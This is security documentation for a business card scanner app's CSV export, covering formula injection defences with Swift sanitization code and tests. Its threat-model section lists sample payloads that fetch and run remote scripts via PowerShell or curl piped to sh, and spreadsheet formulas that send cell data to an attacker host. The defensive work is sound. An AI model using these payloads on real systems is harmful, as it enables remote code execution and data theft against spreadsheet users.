# Export Security Documentation

**Application:** Deets - Business Card Scanner
**Last Updated:** November 5, 2025
**Status:** Production-ready with comprehensive security controls

---

## Overview

This document details the security measures implemented in the CSV export functionality to protect users from formula injection attacks and other export-related vulnerabilities.

---

## CSV Formula Injection Protection

### Threat Model

**Attack Vector:** Malicious OCR Input
**Risk:** CRITICAL (Pre-fix)
**Status:** MITIGATED ✅

#### Attack Scenario
1. Attacker creates a business card containing malicious formula text
2. Victim scans the card using Deets OCR functionality
3. OCR extracts malicious payload (e.g., `=cmd|'/c calc'!A1`)
4. Victim exports data to CSV format
5. Victim opens CSV in Excel, Google Sheets, or LibreOffice
6. Spreadsheet application executes the formula, running arbitrary code

#### Real-World Attack Examples

**Command Execution (Windows)**
```
=cmd|'/c calc'!A1
=cmd|'/c powershell IEX(wget malicious.com/shell.ps1)'!A1
```

**Command Execution (macOS/Linux)**
```
=cmd|'/bin/sh -c "curl malicious.com/payload.sh | sh"'!A1
```

**Data Exfiltration**
```
=HYPERLINK("http://attacker.com/steal?data="&A1&A2,"Click Here")
@SUM(1+1)+WEBSERVICE("http://attacker.com/log?user="&A1)
```

**Credential Harvesting**
```
=IMPORTXML("http://attacker.com/phish","//credentials")
```

---

## Implementation

### Sanitization Function

Located in `/Deets/Services/Export/CSVExporter.swift` (lines 150-164):

```swift
/// Sanitize value to prevent CSV formula injection attacks
/// - Prepends single quote to values starting with formula indicators: = + - @ \t \r
/// - Prevents code execution when CSV is opened in Excel, Google Sheets, LibreOffice
/// - Parameter value: Raw cell value (potentially from untrusted OCR input)
/// - Returns: Sanitized value safe for CSV export
private static func sanitizeFormulaInjection(_ value: String) -> String {
    guard !value.isEmpty else { return value }

    // Formula injection indicators per OWASP CSV Injection guidelines
    let dangerousChars: Set<Character> = ["=", "+", "-", "@", "\t", "\r"]

    // Check if first character is a formula indicator
    if let firstChar = value.first, dangerousChars.contains(firstChar) {
        // Prepend single quote to neutralize formula execution
        // Excel/Sheets will treat this as text, not a formula
        return "'\(value)"
    }

    return value
}
```

### Integration with CSV Escaping

Located in `/Deets/Services/Export/CSVExporter.swift` (lines 172-186):

```swift
/// Escape a value for CSV format with formula injection protection
/// - Sanitizes formula injection attacks (= + - @ \t \r prefixes)
/// - Wraps in quotes if contains comma, newline, or quote
/// - Escapes quotes by doubling them
/// - Parameter value: Raw cell value to export
/// - Returns: Safe CSV cell value
private static func escapeCSV(_ value: String) -> String {
    // SECURITY: Sanitize formula injection FIRST before CSV escaping
    let sanitized = sanitizeFormulaInjection(value)

    // Check if CSV structural escaping is needed
    let needsEscaping = sanitized.contains(",") || sanitized.contains("\"") ||
                        sanitized.contains("\n") || sanitized.contains("\r")

    if needsEscaping {
        // Escape quotes by doubling them per CSV RFC 4180
        let escaped = sanitized.replacingOccurrences(of: "\"", with: "\"\"")
        return "\"\(escaped)\""
    } else {
        return sanitized
    }
}
```

### How It Works

1. **Detection**: Checks if first character is a formula indicator (`=`, `+`, `-`, `@`, `\t`, `\r`)
2. **Neutralization**: Prepends single quote (`'`) to dangerous values
3. **Preservation**: Original data is preserved but rendered as text, not executable code
4. **CSV Escaping**: Standard CSV escaping (quotes, commas) applied after sanitization

### Example Transformations

| Input | Output | Explanation |
|-------|--------|-------------|
| `John Doe` | `John Doe` | Normal text unchanged |
| `=1+1` | `'=1+1` | Formula neutralized |
| `=cmd\|'/c calc'!A1` | `'=cmd\|'/c calc'!A1` | Command injection blocked |
| `@SUM(A1:A10)` | `'@SUM(A1:A10)` | Function call prevented |
| `+1-555-1234` | `'+1-555-1234` | Phone number sanitized (safe) |
| `=1+1, Inc` | `"'=1+1, Inc"` | Both formula + CSV escaping |

---

## Testing Coverage

### Unit Tests

Located in `/DeetsTests/ExportTests.swift` (lines 260-433):

**Test Suite: CSV Formula Injection Security**
- ✅ `testCSVFormulaInjectionEquals` - Equals sign formulas
- ✅ `testCSVFormulaInjectionPlus` - Plus sign formulas
- ✅ `testCSVFormulaInjectionMinus` - Minus sign formulas
- ✅ `testCSVFormulaInjectionAt` - At symbol formulas
- ✅ `testCSVFormulaInjectionTab` - Tab character prefix
- ✅ `testCSVFormulaInjectionCarriageReturn` - Carriage return prefix
- ✅ `testCSVFormulaInjectionNormalText` - Normal text preservation
- ✅ `testCSVFormulaInjectionEmptyValues` - Empty value handling
- ✅ `testCSVFormulaInjectionWithCSVEscaping` - Combined sanitization
- ✅ `testCSVFormulaInjectionRealWorldOCR` - Real attack scenarios
- ✅ `testCSVFormulaInjectionMultipleCards` - Batch export validation

### Verification Script

Run `/verify_csv_injection_fix.swift` for standalone validation:

```bash
swift verify_csv_injection_fix.swift
```

**Expected Output:**
```
CSV Formula Injection Security Fix Verification

============================================================
✅ PASS: Equals formula
✅ PASS: Command injection
✅ PASS: Plus formula
✅ PASS: Plus command
✅ PASS: Minus formula
✅ PASS: At formula
✅ PASS: Tab prefix
✅ PASS: Carriage return prefix
✅ PASS: HYPERLINK injection
✅ PASS: PowerShell injection
✅ PASS: Normal name
✅ PASS: Normal company
✅ PASS: Email address
✅ PASS: Empty string
✅ PASS: Phone number with plus

============================================================
Results: 15 passed, 0 failed
✅ All tests passed! CSV formula injection vulnerability is FIXED.
```

---

## Compliance & Standards

### OWASP Compliance

**OWASP CSV Injection Prevention**
- ✅ Implements single quote prefix neutralization
- ✅ Covers all dangerous formula indicators: `=`, `+`, `-`, `@`, `\t`, `\r`
- ✅ Tested against OWASP attack vectors
- ✅ Defense-in-depth with CSV structural escaping

**Reference:** [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)

### CWE Coverage

**CWE-1236: CSV Injection**
- ✅ Sanitizes user-controlled input before CSV export
- ✅ Neutralizes formula execution triggers
- ✅ Comprehensive test coverage
- ✅ Documentation and awareness

**Reference:** [CWE-1236](https://cwe.mitre.org/data/definitions/1236.html)

### Industry Standards

**CSV RFC 4180 Compliance**
- ✅ Proper quote escaping (double quotes)
- ✅ Comma, newline, quote handling
- ✅ Formula sanitization as security extension

---

## Edge Cases & Considerations

### Legitimate Data Starting with Formula Characters

**Phone Numbers:**
- Input: `+1-555-1234`
- Output: `'+1-555-1234`
- **Rationale:** While legitimate, `+` is a formula indicator. Sanitization prevents potential abuse while preserving data integrity.

**Negative Numbers:**
- Input: `-42`
- Output: `'-42`
- **Rationale:** Minus sign can trigger formulas. Sanitized for security. Users can still import as text.

**Email Addresses (Safe):**
- Input: `user@example.com`
- Output: `user@example.com`
- **Rationale:** `@` in middle of string is safe. Only prefix `@` is dangerous.

### Known Limitations

1. **Data Presentation:** Sanitized values display with leading quote in Excel (as intended)
2. **Numeric Interpretation:** Sanitized negative numbers treated as text, not numbers
3. **Phone Number Formatting:** Sanitized phone numbers with `+` require manual formatting in spreadsheet

**Trade-off:** Security takes priority over convenience. Users opening CSV files with malicious content are protected at the cost of minor formatting adjustments for legitimate edge cases.

---

## Security Maintenance

### Regular Review Checklist

- [ ] Review OWASP CSV injection guidelines for new attack vectors
- [ ] Test against latest Excel, Google Sheets, LibreOffice versions
- [ ] Monitor security advisories for CSV-related vulnerabilities
- [ ] Update test suite with newly discovered attack patterns
- [ ] Verify sanitization performance at scale (10k+ records)

### Reporting Security Issues

If you discover a bypass or vulnerability in the CSV export sanitization:

1. **DO NOT** create a public GitHub issue
2. Email security concerns to the development team
3. Include: PoC, attack vector, impact assessment
4. Allow 90 days for patching before public disclosure

---

## References

### Security Resources

- [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [CWE-1236: CSV Injection](https://cwe.mitre.org/data/definitions/1236.html)
- [CSV RFC 4180](https://www.rfc-editor.org/rfc/rfc4180)
- [Google Sheets Formula Injection](https://www.contextis.com/en/blog/comma-separated-vulnerabilities)

### Related Documentation

- [SECURITY_AUDIT_REPORT.md](/SECURITY_AUDIT_REPORT.md) - Full security audit
- [CSVExporter.swift](/Deets/Services/Export/CSVExporter.swift) - Implementation
- [ExportTests.swift](/DeetsTests/ExportTests.swift) - Test suite

---

## Version History

| Date | Version | Changes |
|------|---------|---------|
| 2025-11-05 | 1.0.0 | Initial implementation of formula injection protection |
| 2025-11-05 | 1.0.1 | Added comprehensive test suite (13 tests) |
| 2025-11-05 | 1.0.2 | Documentation and verification script |

---

**Security Status:** PRODUCTION-READY ✅
**Last Security Review:** November 5, 2025
**Next Review:** January 5, 2026
